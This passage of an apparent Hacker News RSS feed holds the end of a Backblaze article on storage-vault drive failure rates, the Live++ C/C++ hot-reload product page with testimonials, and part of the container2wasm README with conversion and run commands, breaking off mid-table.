<p>Speaking of systems with less than 60 drives, the Dell servers are 26 drives. Those 26 drives are in a 2U chassis versus a 4U chassis for all of the other servers. The Dell servers are not quite as dense as the 60 drive units, but their 2U form factor gives us some flexibility in filling racks, especially when you add utility servers (1U or 2U) and networking gear to the mix. That‚Äôs one of the reasons the two Dell Vaults we noted earlier were moved to the top of the 52U racks. FYI, those two Vaults hold 14TB drives and are two of the four 14TB Dell Vaults making up the 5.46% AFR. The AFR for the Dell Vaults with 12TB and 16TB drives is 0.76% and 0.92% respectively. As noted earlier, we expect the AFR for 14TB Dell Vaults to drop over the coming months.</p>
<h2>What Have We Learned?</h2>
<p>Our goal today was to see what we can learn about the drive failure rates of the storage servers we use in our data centers. All of our storage servers are grouped in operational systems we call Backblaze Vaults. There are six different cohorts of storage servers with each vault being composed of the same type of storage server, hence there are six types of vaults.&nbsp;</p>
<p>As we dug into data, we found that the different cohorts of Vaults had different annualized failure rates. What we didn‚Äôt find was a correlation between the age of the drives used in the servers and the annualized failure rates of the different Vault cohorts. For example, the Backblaze 5.0 Vaults have a much lower AFR of 0.99%&nbsp; versus the Backblaze 6.0 Vault AFR at 2.14%‚Äîeven though the drives in the 5.0 Vaults are nearly twice as old on average than the drives in the 6.0 Vaults.</p>
<p>This suggests that while our initial foray into the annualized failure rates of the different Vault cohorts is a good first step, there is more to do here.</p>
<h2>Where Do We Go From Here?</h2>
<p>In general, all of the Vaults in a given cohort were manufactured to the same specifications, used the same parts, and were assembled using the same processes. One obvious difference is that different drive models are used in each Vault cohort. For example, the 16TB vaults are composed of seven different drive models. Do some drive models work better in one Vault cohort versus another? Over the next couple of quarters we‚Äôll dig into the data and let you know what we find. Hopefully it will add to our understanding of the annualized failures rates of the different Vault cohorts. Stay tuned.</p>
</div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Ambiphone, no-nonsense ambient music and white noise (139 pts)]]></title>
            <link>https://ambiph.one?hn</link>
            <guid>38856999</guid>
            <pubDate>Wed, 03 Jan 2024 17:41:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ambiph.one?hn">https://ambiph.one?hn</a>, See on <a href="https://news.ycombinator.com/item?id=38856999">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[C and C++ Hot-Reload/Live Coding (105 pts)]]></title>
            <link>https://liveplusplus.tech/</link>
            <guid>38856696</guid>
            <pubDate>Wed, 03 Jan 2024 17:20:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://liveplusplus.tech/">https://liveplusplus.tech/</a>, See on <a href="https://news.ycombinator.com/item?id=38856696">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content" role="main">
      <div>
          

          <div>
              <h2>
                <span>Live++<sup>¬Æ</sup> 2</span> - spend more time coding <em>and less time loading</em>.<br>
                  <span>Hot</span>-Reload. <span>Hot</span>-Restart. <span>Hot</span>-Fix. <span>Hot</span>-Deoptimize.
              </h2>

              <iframe src="https://www.youtube.com/embed/ewbkdxskl7I?playlist=ewbkdxskl7I&amp;loop=1" title="Live++ overview" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

              <h2>
                <p>
                  The next generation of the industry-standard tool for Windows &amp; Xbox Series X|S.
                </p>
                <p>
                  <img alt="C++ logo" src="https://liveplusplus.tech/images/assets/products/cpp_logo.svg" width="64" height="64">
                  <img alt="Windows logo" src="https://liveplusplus.tech/images/assets/products/windows_logo.svg" width="64" height="64">
                  <img alt="Xbox Series X|S logo" src="https://liveplusplus.tech/images/assets/products/xbox_series_logo.svg" width="64" height="64">
                </p>
              </h2>
              <p>
                <a href="http://eepurl.com/ikKAqf" target="_blank">
                  Want to stay up to date with the latest releases and upcoming closed betas?<br>Subscribe to our mailing list
                </a>
              </p>
            </div>
          <hr>
          <div>
            <ul>
              <li>
                <h3>
                  Native speed
                </h3>
                <p>
                  <em>Live++</em> enables hot-reload for C &amp; C++ applications, combining the power of rapid iteration with the speed of a compiled language.
                </p>
              </li>
              <li>
                <img src="https://liveplusplus.tech/images/assets/hot_reload.png">
              </li>
            </ul>
            <ul>
              <li>
                <h3>
                  Binary code patching
                </h3>
                <p>
                  <em>Live++</em> compiles your changes in the background, directly patching the machine code of the running executable. It works with any kind of C &amp; C++ code and requires neither plug-ins nor a debugger or IDE.
                </p>
              </li>
              <li>
                <img src="https://liveplusplus.tech/images/assets/binary_patching.png">
              </li>
            </ul>

            <ul>
              <li>
                <h3>
                  Stand-alone
                </h3>
                <p>
                  Start your application from anywhere, modify its source code using your favourite editor, and let <em>Live++</em> do the rest.
                </p>
              </li>
              <li>
                <img src="https://liveplusplus.tech/images/assets/editor_vs.png">
              </li>
              <li>
                <img src="https://liveplusplus.tech/images/assets/editor_10x.png">
              </li>
            </ul>
          </div>

          <div>
            <ul>
              <li>
                <h3>
                  Versatile
                </h3>
                <p>
                  Whether you're working on new features, trying out gameplay mechanics, optimizing code, or fixing bugs, <em>Live++</em> will massively cut down your iteration times.
                </p>
              </li>
              <li>
                <h3>
                  Reliable
                </h3>
                <p>
                  <em>Live++</em> reliably works with both debug and optimized builds, supports multi-process and networked editing, and does not care about your build setup.
                </p>
              </li>
              <li>
                <h3>
                  Technical background
                </h3>
                <p>
                  Interested in how <em>Live++</em> works?
                </p>
                <p>
                  Check out <u><a href="https://liveplusplus.tech/downloads/THQ_Nordic_Dev_Summit_2023_Live++_Behind_the_Scenes.pptx">this talk</a></u> from the <span>THQ Nordic Dev Summit 2023</span>.
                </p>
              </li>
            </ul>
          </div>

        </div>

      <div>
              <h2>
                <p>
                  Join thousands of other developers and grab your free 30-day trial today.<br>
                  Includes example projects and solutions for Visual Studio 2017, 2019, and 2022.<br>
                  Fully featured, no registration required, no strings attached.
                </p>
              </h2>
              <p>
                <a href="https://liveplusplus.tech/trial_download.html">
                  <span>DOWNLOAD 30-DAY TRIAL</span>
                </a>
              </p>
            </div>

      <!-- Testimonials -->
      <div>
          
          <p>
            In addition to supporting thousands of developers using Unreal Engine all around the world, <em>Live++</em> is used by more than 70 companies on their proprietary engines and frameworks.
          </p>
          <p>
            Still not convinced? Check out what some of our customers have to say about <em>Live++</em>:
          </p>

          <div>
            <ul>
              <li>
                <div>
                  <p>
                    Live++ is "Edit and Continue that actually works". Programmers at Asobo Studio have been using it throughout development of Asobo Studio's C++-based products (millions of lines of code). It has become a standard part of our workflow, increasing developer productivity (and happiness üòä).
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    I came to rely on Live++ in an almost unhealthy way. There's no C++ code I am working on where it can't be profitably used. It's integrated in minutes and gets me reliably around seconds or even minutes long program re-starts. Live++ also became my investigation sandbox in which I can explore and refactor my running code. I hunt down bugs by querying and testing my code interactively and old-school debugging methods get a modern spin - debug prints and runtime variable modification on steroids.
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    Seeing Live++ in action seems like magic, and it very well might be. Aside from our Unreal projects we used it on a game with a custom engine and a very long iteration cycle. Over the five years of development, Live++ likely saved us months by avoiding the dreaded "change line - compile - load - test - repeat" cycle and letting us experiment and implement the game logic while the game was running. Between integration taking just a few minutes, and the free trial being available, there really isn't an excuse to not give it a try!
                  </p>
                  
                </div>
              </li>
            </ul>
          </div>

          

          <div>
            <ul>
              <li>
                <div>
                  <p>
                    Live++ is the single biggest improvement in productivity for C++ codebases. Fast feedback loops are a superpower.
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    We integrated Live++ into Godot 4.0 and it was surprising how little work it required compared to how much it improved the workflow.<br>The time invested already paid off in the same week.
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    Live++ has enabled engineers across Frostbite, and the game teams using it, to iterate and debug so much faster. No longer needing to restart the game/editor to apply changes is fantastic, but being able to deoptimize the current file has been a godsend for productivity. Can't recommend it enough!
                  </p>
                  
                </div>
              </li>
            </ul>
          </div>

          

          <div>
            <ul>
              <li>
                <div>
                  <p>
                    Most of the companies our embedded engineers provide services for thankfully use Live++ to supercharge their workflows.<br>
                    But even if we can't convince a client of its merits: Integration takes less than fifteen minutes and is easily shared among engineers locally without ever reaching version control, making for an amazing covert productivity boost.<br>
                    It's hard not to feel like a secret agent with gadgetry this nifty!
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    Live++ has been a game changer for me. The ability to make changes to code while the application is running supercharges iteration times and makes tweaking and tuning behaviours so much easier. It's also come in handy a number of times when debugging an issue. Being able to add extra logging/instrumentation without having to restart the application is incredibly useful.
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    Live++ is crazy simple to integrate and has transformed my workflow. Returning to a codebase without live editing feels like stepping into the distant past. Iterating faster lets me stay focused, save time, save money, and honestly just be happier every day while working.
                  </p>
                  
                </div>
              </li>
            </ul>
          </div>

          

          <div>
            <ul>
              <li>
                <div>
                  <p>
                    Remember reloading the same level over and over just to test small code changes? Me neither.
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    I love that I can disable optimizations on individual files <em>while I am debugging</em> without needing to restart and compile the program.
                  </p>
                  
                </div>
              </li>
              <li>
                <div>
                  <p>
                    Live++ massively reduced my iteration times. No more quit-compile-restart cycle. And the cherry on top: Writing IMGUI code with Live++ is just amazingly interactive. 10/10, would hot-reload again ;)
                  </p>
                  
                </div>
              </li>
            </ul>
          </div>

          

          <div>
            <ul>
              <li>
                <div>
                  <p>
                    Live++ is a core pillar of my tool suite for optimizing critical code in both hobby and professional projects.<br>
                    Hot-reloading code changes in mere milliseconds decreased iteration times tremendously. It lets me quickly try out several optimization approaches and compare their impact in a single performance capture session.<br>
                    Any project that doesn't support this now feels like it's missing a fundamental part of the modern development process.
                  </p>
                  
                </div>
              </li>
            </ul>
          </div>
        </div>

      <!-- Customers -->
      
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Container2wasm: Convert Containers to WASM Blobs (112 pts)]]></title>
            <link>https://github.com/ktock/container2wasm</link>
            <guid>38856559</guid>
            <pubDate>Wed, 03 Jan 2024 17:10:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/ktock/container2wasm">https://github.com/ktock/container2wasm</a>, See on <a href="https://news.ycombinator.com/item?id=38856559">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><p dir="auto"><a href="https://github.com/ktock/container2wasm/releases">[:arrow_down: <strong>Download</strong>]</a>
<a href="#command-reference">[:book: <strong>Command reference</strong>]</a>
<a href="#additional-resources">[:books: <strong>Additional Documents</strong>]</a>
<a href="https://ktock.github.io/container2wasm-demo/" rel="nofollow">[:arrow_forward: <strong>Demo</strong>]</a></p>
<h2 tabindex="-1" dir="auto">container2wasm: Container to WASM converter</h2>
<p dir="auto">container2wasm is a container-to-wasm image converter that enables to run the container on WASM.</p>
<ul dir="auto">
<li>Converts a container to WASM with emulation by Bochs (for x86_64 containers) and TinyEMU (for riscv64 containers).</li>
<li>Runs on WASI runtimes (e.g. wasmtime, wamr, wasmer, wasmedge, wazero)</li>
<li>Runs on browser</li>
<li>x86_64 or riscv64 containers are recommended. Other platforms (e.g. arm64) also work (but slow).</li>
</ul>
<p dir="auto">This is an experimental software.</p>
<p dir="auto">Demo page of containers on browser (debian,python,node,vim): <a href="https://ktock.github.io/container2wasm-demo/" rel="nofollow">https://ktock.github.io/container2wasm-demo/</a></p>
<h2 tabindex="-1" dir="auto">Examples</h2>
<h3 tabindex="-1" dir="auto">Container Image to WASM (WASI)</h3>
<div dir="auto" data-snippet-clipboard-copy-content="$ c2w ubuntu:22.04 out.wasm"><pre>$ <span>c2w ubuntu:22.04 out.wasm</span></pre></div>
<p dir="auto">The above command converts <code>ubuntu:22.04</code> container image to WASI image (<code>out.wasm</code>).</p>
<blockquote>
<p dir="auto">NOTE1: For selecting the container image's architecture other than <code>amd64</code>, use <code>--target-arch</code> flag of c2w (e.g. <code>c2w --target-arch=riscv64 riscv64/ubuntu:22.04 out.wasm</code>).</p>
</blockquote>
<blockquote>
<p dir="auto">NOTE2: x86_64 or riscv64 container is recommended. Other platform's containers should work but slow because of additional emulation.</p>
</blockquote>
<p dir="auto">The generated image runs on WASI runtimes:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ wasmtime out.wasm uname -a
Linux localhost 6.1.0 #1 PREEMPT_DYNAMIC Mon Jun  5 11:57:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
$ wasmtime out.wasm ls /
bin   dev  home  lib32	libx32	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 lib64	media	opt  root  sbin  sys  usr"><pre>$ <span>wasmtime out.wasm uname -a</span>
<span>Linux localhost 6.1.0 #1 PREEMPT_DYNAMIC Mon Jun  5 11:57:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
$ <span>wasmtime out.wasm ls /</span>
<span>bin   dev  home  lib32	libx32	mnt  proc  run	 srv  tmp  var</span>
<span>boot  etc  lib	 lib64	media	opt  root  sbin  sys  usr</span></pre></div>
<p dir="auto">Directory mapped from the host is accessible on the container.</p>
<div data-snippet-clipboard-copy-content="$ mkdir -p /tmp/share/ &amp;&amp; echo hi > /tmp/share/from-host
$ wasmtime --mapdir /mnt/share::/tmp/share out.wasm cat /mnt/share/from-host
hi"><pre><code>$ mkdir -p /tmp/share/ &amp;&amp; echo hi &gt; /tmp/share/from-host
$ wasmtime --mapdir /mnt/share::/tmp/share out.wasm cat /mnt/share/from-host
hi
</code></pre></div>
<blockquote>
<p dir="auto">Please refer to <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/wasi"><code>./examples/networking/wasi/</code></a> for enabling networking</p>
</blockquote>
<h3 tabindex="-1" dir="auto">Container on Browser</h3>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ktock/container2wasm/blob/main/docs/images/ubuntu-wasi-on-browser.png"><img src="https://github.com/ktock/container2wasm/raw/main/docs/images/ubuntu-wasi-on-browser.png" alt="Container on browser"></a></p>
<p dir="auto">You can run the container on browser as well.
There are two methods for running the container on browser.</p>
<blockquote>
<p dir="auto">Please also refer to <a href="https://github.com/ktock/container2wasm/blob/main/examples/wasi-browser"><code>./examples/wasi-browser</code></a> (WASI-on-browser example) and <a href="https://github.com/ktock/container2wasm/blob/main/examples/emscripten"><code>./examples/emscripten</code></a> (emscripten example).</p>
</blockquote>
<blockquote>
<p dir="auto">Please refer to <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking"><code>./examples/networking/</code></a> for details about enabling networking.</p>
</blockquote>
<h4 tabindex="-1" dir="auto">WASI on browser</h4>
<p dir="auto">This example converts the container to WASI and runs it on browser.</p>
<p dir="auto">The following command generates a WASI image.</p>
<div data-snippet-clipboard-copy-content="$ c2w ubuntu:22.04 /tmp/out-js2/htdocs/out.wasm"><pre><code>$ c2w ubuntu:22.04 /tmp/out-js2/htdocs/out.wasm
</code></pre></div>
<p dir="auto">The following is an example of running the image on browser relying on <a href="https://github.com/mame/xterm-pty">xterm-pty</a> and <a href="https://github.com/bjorn3/browser_wasi_shim">browser_wasi_shim</a>.
This example serves the image on <code>localhost:8080</code> using apache http server.</p>
<div data-snippet-clipboard-copy-content="$ cp -R ./examples/wasi-browser/* /tmp/out-js2/ &amp;&amp; chmod 755 /tmp/out-js2/htdocs
$ docker run --rm -p 8080:80 \
         -v &quot;/tmp/out-js2/htdocs:/usr/local/apache2/htdocs/:ro&quot; \
         -v &quot;/tmp/out-js2/xterm-pty.conf:/usr/local/apache2/conf/extra/xterm-pty.conf:ro&quot; \
         --entrypoint=/bin/sh httpd -c 'echo &quot;Include conf/extra/xterm-pty.conf&quot; >> /usr/local/apache2/conf/httpd.conf &amp;&amp; httpd-foreground'"><pre><code>$ cp -R ./examples/wasi-browser/* /tmp/out-js2/ &amp;&amp; chmod 755 /tmp/out-js2/htdocs
$ docker run --rm -p 8080:80 \
         -v "/tmp/out-js2/htdocs:/usr/local/apache2/htdocs/:ro" \
         -v "/tmp/out-js2/xterm-pty.conf:/usr/local/apache2/conf/extra/xterm-pty.conf:ro" \
         --entrypoint=/bin/sh httpd -c 'echo "Include conf/extra/xterm-pty.conf" &gt;&gt; /usr/local/apache2/conf/httpd.conf &amp;&amp; httpd-foreground'
</code></pre></div>
<p dir="auto">You can run the container on browser via <code>localhost:8080</code>.</p>
<h5 tabindex="-1" dir="auto">WASI on browser with networking</h5>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ktock/container2wasm/blob/main/docs/images/debian-curl-wasi-on-browser-frontend-networking.png"><img src="https://github.com/ktock/container2wasm/raw/main/docs/images/debian-curl-wasi-on-browser-frontend-networking.png" alt="Debian container on browser with browser networking"></a></p>
<p dir="auto">Container can also perform networking.
This section is the demo of using curl command in the container.</p>
<blockquote>
<p dir="auto">Tested only on Chrome. The example might not work on other browsers.</p>
</blockquote>
<div data-snippet-clipboard-copy-content="$ cat <<EOF | docker build -t debian-curl -
FROM debian:sid-slim
RUN apt-get update &amp;&amp; apt-get install -y curl
EOF
$ c2w debian-curl /tmp/out-js2/htdocs/out.wasm"><pre><code>$ cat &lt;&lt;EOF | docker build -t debian-curl -
FROM debian:sid-slim
RUN apt-get update &amp;&amp; apt-get install -y curl
EOF
$ c2w debian-curl /tmp/out-js2/htdocs/out.wasm
</code></pre></div>
<p dir="auto">This example serves the image on <code>localhost:8080</code> using apache http server.
The following also puts the <a href="https://github.com/ktock/container2wasm/blob/main/extras/c2w-net-proxy">network stack runnable on browser</a> to the document root.</p>
<div data-snippet-clipboard-copy-content="$ cp -R ./examples/wasi-browser/* /tmp/out-js2/ &amp;&amp; chmod 755 /tmp/out-js2/htdocs
$ wget -O /tmp/out-js2/htdocs/c2w-net-proxy.wasm https://github.com/ktock/container2wasm/releases/download/v0.5.0/c2w-net-proxy.wasm
$ docker run --rm -p 8080:80 \
         -v &quot;/tmp/out-js2/htdocs:/usr/local/apache2/htdocs/:ro&quot; \
         -v &quot;/tmp/out-js2/xterm-pty.conf:/usr/local/apache2/conf/extra/xterm-pty.conf:ro&quot; \
         --entrypoint=/bin/sh httpd -c 'echo &quot;Include conf/extra/xterm-pty.conf&quot; >> /usr/local/apache2/conf/httpd.conf &amp;&amp; httpd-foreground'"><pre><code>$ cp -R ./examples/wasi-browser/* /tmp/out-js2/ &amp;&amp; chmod 755 /tmp/out-js2/htdocs
$ wget -O /tmp/out-js2/htdocs/c2w-net-proxy.wasm https://github.com/ktock/container2wasm/releases/download/v0.5.0/c2w-net-proxy.wasm
$ docker run --rm -p 8080:80 \
         -v "/tmp/out-js2/htdocs:/usr/local/apache2/htdocs/:ro" \
         -v "/tmp/out-js2/xterm-pty.conf:/usr/local/apache2/conf/extra/xterm-pty.conf:ro" \
         --entrypoint=/bin/sh httpd -c 'echo "Include conf/extra/xterm-pty.conf" &gt;&gt; /usr/local/apache2/conf/httpd.conf &amp;&amp; httpd-foreground'
</code></pre></div>
<p dir="auto">You can run the container on browser with several types of configurations:</p>
<ul dir="auto">
<li><code>localhost:8080/?net=browser</code>: Container with networking. <a href="https://github.com/ktock/container2wasm/blob/main/extras/c2w-net-proxy">Network stack <code>c2w-net-proxy</code></a> implemented based on <a href="https://github.com/containers/gvisor-tap-vsock"><code>gvisor-tap-vsock</code></a> runs on browser and forwards HTTP/HTTPS packets using the browser's Fetch API. The set of accesible sites is restricted by the browser configuration (e.g. CORS restriction). See also <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/fetch"><code>./examples/networking/fetch</code></a> for detalis.</li>
<li><code>localhost:8080/?net=delegate=ws://localhost:8888</code>: Container with networking. You need to run <a href="https://github.com/ktock/container2wasm/blob/main/cmd/c2w-net">user-space network stack <code>c2w-net</code></a> implemented based on <a href="https://github.com/containers/gvisor-tap-vsock"><code>gvisor-tap-vsock</code></a> on the host (outside of browser). It forwards all packets received from the browser over WebSocket. See also <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/websocket"><code>./examples/networking/websocket</code></a> for detalis and configuration. (tested only on Linux)</li>
<li><code>localhost:8080</code>: Container without networking.</li>
</ul>
<h4 tabindex="-1" dir="auto">emscripten on browser</h4>
<p dir="auto">This example uses emscripten for converting the container to WASM.</p>
<ul dir="auto">
<li>pros: WASM image size can be smaller than WASI.</li>
<li>cons: WASI-specific optimization like <a href="https://github.com/bytecodealliance/wizer/">Wizer</a> pre-initialization isn't available for this mode. So the startup of the container can be slow (For x86_64 containers it might take &gt;= 30s. For riscv64 containers it might take &gt;= 10s).</li>
</ul>
<p dir="auto">The following command generates a WASM image and a JS file runnable on browser.</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ c2w --to-js ubuntu:22.04 /tmp/out-js/htdocs/"><pre>$ <span>c2w --to-js ubuntu:22.04 /tmp/out-js/htdocs/</span></pre></div>
<p dir="auto">The following is an example of running the image on browser relying on <a href="https://github.com/mame/xterm-pty">xterm-pty</a>.
This example serves the image on <code>localhost:8080</code> using apache http server.</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ cp -R ./examples/emscripten/* /tmp/out-js/ &amp;&amp; chmod 755 /tmp/out-js/htdocs
$ docker run --rm -p 8080:80 \
         -v &quot;/tmp/out-js/htdocs:/usr/local/apache2/htdocs/:ro&quot; \
         -v &quot;/tmp/out-js/xterm-pty.conf:/usr/local/apache2/conf/extra/xterm-pty.conf:ro&quot; \
         --entrypoint=/bin/sh httpd -c 'echo &quot;Include conf/extra/xterm-pty.conf&quot; >> /usr/local/apache2/conf/httpd.conf &amp;&amp; httpd-foreground'"><pre>$ <span>cp -R ./examples/emscripten/<span>*</span> /tmp/out-js/ <span>&amp;&amp;</span> chmod 755 /tmp/out-js/htdocs</span>
$ <span>docker run --rm -p 8080:80 \</span>
<span>         -v "/tmp/out-js/htdocs:/usr/local/apache2/htdocs/:ro" \</span>
<span>         -v "/tmp/out-js/xterm-pty.conf:/usr/local/apache2/conf/extra/xterm-pty.conf:ro" \</span>
<span>         --entrypoint=/bin/sh httpd -c 'echo "Include conf/extra/xterm-pty.conf" &gt;&gt; /usr/local/apache2/conf/httpd.conf &amp;&amp; httpd-foreground'</span></pre></div>
<p dir="auto">You can run the container on browser via <code>localhost:8080</code>.</p>
<blockquote>
<p dir="auto">NOTE: It can take some time to load and start the container.</p>
</blockquote>
<p dir="auto">Networking can also be enabled using the <a href="https://github.com/ktock/container2wasm/blob/main/cmd/c2w-net">user-space network stack <code>c2w-net</code></a> implemented based on <a href="https://github.com/containers/gvisor-tap-vsock"><code>gvisor-tap-vsock</code></a> serving over WebSocket on the host (outside of browser).
See also <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/websocket"><code>./examples/networking/websocket</code></a> for detalis.</p>
<h2 tabindex="-1" dir="auto">Getting Started</h2>
<ul dir="auto">
<li>requirements
<ul dir="auto">
<li>Docker 18.09+ (w/ <code>DOCKER_BUILDKIT=1</code>)</li>
<li><a href="https://docs.docker.com/build/install-buildx/" rel="nofollow">Docker Buildx</a> v0.8+ (recommended) or <code>docker build</code> (w/ <code>DOCKER_BUILDKIT=1</code>)</li>
</ul>
</li>
</ul>
<p dir="auto">You can install the converter command <code>c2w</code> using one of the following methods.</p>
<blockquote>
<p dir="auto">NOTE: The output binary also contains <a href="https://github.com/ktock/container2wasm/blob/main/cmd/c2w-net"><code>c2w-net</code></a> which a command usable for controlling networking feature (please see also <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking">./examples/networking</a> for details).</p>
</blockquote>
<h3 tabindex="-1" dir="auto">Release binaries</h3>
<p dir="auto">Binaries are available from <a href="https://github.com/ktock/container2wasm/releases">https://github.com/ktock/container2wasm/releases</a>
Extract the tarball and put the binary somewhere under <code>$PATH</code>.</p>
<h3 tabindex="-1" dir="auto">Building binaries using make</h3>
<p dir="auto">Go 1.19+ is needed.</p>

<h2 tabindex="-1" dir="auto">Command reference</h2>
<h3 tabindex="-1" dir="auto">c2w</h3>
<p dir="auto">Converts a container image into a WASM image and writes it to the specified path (default: <code>out.wasm</code> at the current directory).</p>
<p dir="auto">Usage: <code>c2w [options] image-name [output file]</code></p>
<ul dir="auto">
<li><code>image-name</code>: container image name (will be pulled from the registry if it doesn't exist in Docker)</li>
<li><code>[output file]</code>: path to the result WASM file.</li>
</ul>
<p dir="auto">Sub commands</p>
<ul dir="auto">
<li><code>help, h</code>: Shows a list of commands or help for one command</li>
</ul>
<p dir="auto">Options</p>
<ul dir="auto">
<li><code>--assets value</code>: Custom location of build assets.</li>
<li><code>--dockerfile value</code>: Custom location of Dockerfile (default: embedded to this command)</li>
<li><code>--builder value</code>: Bulider command to use (default: "docker")</li>
<li><code>--target-arch value</code>: target architecture of the source image to use (default: "amd64")</li>
<li><code>--build-arg value</code>: Additional build arguments (please see Dockerfile for available build args)</li>
<li><code>--to-js</code>: convert the container to WASM using emscripten</li>
<li><code>--debug-image</code>: Enable debug print in the output image</li>
<li><code>--show-dockerfile</code>: Show default Dockerfile</li>
<li><code>--legacy</code>: Use "docker build" instead of buildx (no support for assets flag) (default:false)</li>
<li><code>--help, -h</code>: show help</li>
<li><code>--version, -v: </code>print the version</li>
</ul>
<h3 tabindex="-1" dir="auto">Run-time flags for WASM image</h3>
<p dir="auto">You can specify run-time flags to the generated wasm image for configuring the execution (e.g. for changing command to run in the container).</p>
<p dir="auto">Usage: <code>out.wasm [options] [COMMAND] [ARG...]</code></p>
<ul dir="auto">
<li><code>[COMMAND] [ARG...]</code>: command to run in the container. (default: commands specified in the image config)</li>
</ul>
<p dir="auto">Options</p>
<ul dir="auto">
<li><code>-entrypoint &lt;command&gt;</code> : entrypoint command. (default: entrypoint specified in the image config)</li>
<li><code>-no-stdin</code> : disable stdin. (default: false)</li>
</ul>
<p dir="auto">Example:</p>
<p dir="auto">The following changes the container's entrypoint to <code>echo</code> and pass <code>hello</code> to the arguments.</p>
<div data-snippet-clipboard-copy-content="wasmtime -- /app/out.wasm --entrypoint=echo hello"><pre><code>wasmtime -- /app/out.wasm --entrypoint=echo hello
</code></pre></div>
<h3 tabindex="-1" dir="auto">Directory mapping</h3>
<p dir="auto">Directory mapped from the host is accessible on the container.</p>
<div data-snippet-clipboard-copy-content="$ mkdir -p /tmp/share/ &amp;&amp; echo hi > /tmp/share/hi
$ wasmtime --mapdir /test/dir/share::/tmp/share /app/out.wasm ls /test/dir/share/
hi"><pre><code>$ mkdir -p /tmp/share/ &amp;&amp; echo hi &gt; /tmp/share/hi
$ wasmtime --mapdir /test/dir/share::/tmp/share /app/out.wasm ls /test/dir/share/
hi
</code></pre></div>
<h2 tabindex="-1" dir="auto">Motivation</h2>
<p dir="auto">Though more and more programming languages start to support WASM, it's not easy to run the existing programs on WASM.
This sometimes requires re-implementing and re-compiling them and costs extra time for development.
This is a PoC converter tries to solve it by enabling running unmodified containers on WASM.</p>
<h2 tabindex="-1" dir="auto">How does it work</h2>
<p dir="auto">contaienr2wasm creates a WASM image that runs the container and the Linux kernel on the emulated CPU.</p>
<p dir="auto">The following shows the techniqual details:</p>
<ul dir="auto">
<li>Builder: <a href="https://github.com/moby/buildkit">BuildKit</a> runs the conversion steps written in Dockerfile.</li>
<li>Emulator: <a href="https://bochs.sourceforge.io/" rel="nofollow">Bochs</a> emulates x86_64 CPU on WASM. <a href="https://bellard.org/tinyemu/" rel="nofollow">TinyEMU</a> emulates RISC-V CPU on WASM. They're compiled to WASM using <a href="https://github.com/WebAssembly/wasi-sdk">wasi-sdk</a> (for WASI and on-browser) and <a href="https://github.com/emscripten-core/emscripten">emscripten</a> (for on-browser).</li>
<li>Guest OS: Linux runs on the emulated CPU. <a href="https://github.com/opencontainers/runc">runc</a> starts the container. Non-x86 and non-RISC-V containers runs with additional emulation by QEMU installed via <a href="https://github.com/tonistiigi/binfmt"><code>tonistiigi/binfmt</code></a>.</li>
<li>Directory Mapping: WASI filesystem API makes host directories visible to the emulator. Emulators mount them to the guest linux via virtio-9p.</li>
<li>Packaging: <a href="https://github.com/kateinoigakukun/wasi-vfs">wasi-vfs</a> (for WASI and on-browser) and emscripten (for on-browser) are used for packaging the dependencies. The kernel is pre-booted during the build using <a href="https://github.com/bytecodealliance/wizer/">wizer</a> to minimize the startup latency (for WASI only as of now).</li>
<li>Networking: Browser's Fetch API or WebSocket is used for on-browser image. <code>sock_*</code> API is used for WASI. <a href="https://github.com/containers/gvisor-tap-vsock"><code>gvisor-tap-vsock</code></a> can be used as the networking stack. (docs: <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking"><code>./examples/networking/</code></a>)</li>
<li>Security: The converted container runs in the sandboxed WASM (WASI) VM with the limited access to the host system.</li>
</ul>
<h2 tabindex="-1" dir="auto">WASI Runtimes Integration Status</h2>
<ul dir="auto">
<li>
<p dir="auto">‚úîÔ∏è : supported</p>
</li>
<li>
<p dir="auto">üöß : WIP</p>
</li>
<li>
<p dir="auto"><strong>NOTE</strong>: WASI features not listed here are untested (future version will support more features)</p>
</li>
</ul>
<h3 tabindex="-1" dir="auto">x86_64 containers</h3>
<table>
<thead>
<tr>
<th>runtime</th>
<th>stdio</th>
<th>mapdir</th>
<th>networking</th>
<th>note</th>
</tr>
</thead>
<tbody>
<tr>
<td>wasmtime</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è (w/ <a href="https://github.com/ktock/container2wasm/blob/main/examples/networking/wasi">host-side network stack</a>)</td>
<td></td>
</tr>
<tr>
<td>wamr(wasm-micro-runtime)</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è</td>
<td>üöß</td>
<td></td>
</tr>
<tr>
<td>wazero</td>
<td>‚úîÔ∏è</td>
<td>‚úîÔ∏è</td>
